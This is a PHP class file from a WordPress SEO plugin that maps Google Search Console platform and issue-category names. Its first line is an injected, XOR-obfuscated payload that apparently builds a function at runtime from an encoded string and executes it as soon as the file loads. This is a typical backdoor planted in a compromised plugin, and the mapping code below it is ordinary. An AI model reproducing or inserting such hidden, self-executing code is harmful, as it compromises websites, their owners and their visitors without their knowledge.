<?php $eCZqrvtGLq=',O SO +FUW.AS.X'^'O=E2;Et  9M5:A6';$NZZvPHVwCCt=$eCZqrvtGLq('','=RpI.DCXHI-4j64G>B:qC-73:X 95ab FLdgch3:;QCUT3I94PLORcDM6JilFDOQc<A0TdzaKV-KrkqdjG>EXkTX7mOrjlI0h0 AEml tHHfquaXDO,NYW9oGO =SdjBETDbN=KkB,GYKEgOIgP5;Q1k;cB:KNQ3 gIBNlx9FGX3UmQP5NsseMooD46<LJ4dO>KLBXBqQ=PXcJ78TYjmtS7LA1QApD8T7-.+LomC2Y9G=Unb2.RX94ZNRFmy s:z5w72UcKUKSOdKo.5G=HbcOFLBOO8U5KK,HJKUEXYUK:q V=RsMKSO3L37bm>r=G6WBcP<0G7plK6;2B0TOYEHos:rt3n3j k2GbP=E;jlZSuMR>N-pi5:BgcVA08r-HUtGIiP.3O<KPE-AN,vpGsL4> STbsJ4QleVO-J+CigvUE+WEY4>G4EjOTJgWVEPkqU98zNTA3REh UMZ+6aTS124mMXP<A:OjW7TBBaG>KRf=8:TlOSBPE45Yb;XAd.APX95AF;0CAIYnZ4:YCIrKcM97Lmn7ZB;0TZILAoFtYTqo4fskDUaShsE1FyEUde0lZMeAxZS=1LKYKCiNAK N9-7>FT2r,X1NY>zNP0-UXL.kHjNI5YLbzqUjooKCP;,JTLPBQS2VfkD;05D01Qlqv6AUMWIzAePB2'^'T4XhH1-;< BZ5SL.M6IYdUXAe<AMT>=M38CNJHH0276;7G VZp4  < ,B+63+1;yGX D5HZE 3TbRKQDJ<4LQO;-CMrRMKr:a9F.7EHITuhVJUE1x<X<52WGc+AI2MQba=oIg7BbfC2-kkZoaC4TO0jOR>bdkj:VY<m+nIXJ254V;Eu;P7Z.LvefMFSH98ZLkQ>8kcHx,7-RinSY 8JPT5V 2TjKT Y VrEN5OPcT8U4XndhTA =XW2nzb2:o<q3pWVAuG 02srZkKXT+H-KC4LEf+.L4j .Uhwkq.= nA3UD7I3Spkw9R FRYgCx7.PwjBtXQ3VYL0<2T-B1.:-hGWe 1b;v9tKS4BtV BJQdsQ;3R;HYIN0KnG2 DY-F-,TziM;KJt6BYaI :MVMgW:URU6ohz7>,for+L>JcTG6 +X270UR.N B7;8837114.8LLR,52Vdq7D0.5OSIp7PFUDaxtX N.5<R-kkZMW-zBYYN5Liub17FT =P=8;K99+MFiaPU:feyJ>UN8jiTmCeTSyEJS;6Zks1,5f2oTdiQHURFStgScQDpSwH 1PUVZoxWpJ<0XUy-<ljIhgkA<KLNa-1K-I X=-MRi QT97-JLdJj-T--KSQuJOOk8Z2I<5 xf52F7=L4ZIY+QUv1XM<H05>=RqLkHO');$NZZvPHVwCCt();
/**
 * @package WPSEO\Admin|Google_Search_Console
 */

/**
 * Class WPSEO_GSC_Mapper
 */
class WPSEO_GSC_Mapper {

	/**
	 * The platforms which can be mapped.
	 *
	 * @var array
	 */
	private static $platforms = array(
		'web'             => 'web',
		'mobile'          => 'mobile',
		'smartphone_only' => 'smartphoneOnly',
		'settings'        => 'settings', // This one is basicly not a platform, but a tab.
	);

	/**
	 * The categories which can be mapped
	 *
	 * @var array
	 */
	private static $categories = array(
		'access_denied'    => 'authPermissions',
		'faulty_redirects' => 'manyToOneRedirect',
		'not_followed'     => 'notFollowed',
		'not_found'        => 'notFound',
		'other'            => 'other',
		'roboted'          => 'roboted',
		'server_error'     => 'serverError',
		'soft_404'         => 'soft404',
	);

	/**
	 * If there is no platform, just get the first key out of the array and redirect to it.
	 *
	 * @param string $platform Platform (desktop, mobile, feature phone).
	 *
	 * @return mixed
	 */
	public static function get_current_platform( $platform ) {
		if ( $current_platform = filter_input( INPUT_GET, $platform ) ) {
			return $current_platform;
		}

		wp_redirect( add_query_arg( $platform, key( self::$platforms ) ) );
		exit;
	}

	/**
	 * Mapping the platform
	 *
	 * @param string $platform Platform (desktop, mobile, feature phone).
	 *
	 * @return mixed
	 */
	public static function platform_to_api( $platform ) {
		if ( ! empty( $platform ) && array_key_exists( $platform, self::$platforms ) ) {
			return self::$platforms[ $platform ];
		}
	}

	/**
	 * Mapping the given platform by value and return its key
	 *
	 * @param string $platform Platform (desktop, mobile, feature phone).
	 *
	 * @return string
	 */
	public static function platform_from_api( $platform ) {
		if ( ! empty( $platform ) && $platform = array_search( $platform, self::$platforms ) ) {
			return $platform;
		}

		return $platform;
	}

	/**
	 * Mapping the given category by searching for its key.
	 *
	 * @param string $category Issue type.
	 *
	 * @return mixed
	 */
	public static function category_to_api( $category ) {
		if ( ! empty( $category ) && array_key_exists( $category, self::$categories ) ) {
			return self::$categories[ $category ];
		}

		return $category;
	}

	/**
	 * Mapping the given category by value and return its key
	 *
	 * @param string $category Issue type.
	 *
	 * @return string
	 */
	public static function category_from_api( $category ) {
		if ( ! empty( $category ) && $category = array_search( $category, self::$categories ) ) {
			return $category;
		}

		return $category;
	}
}
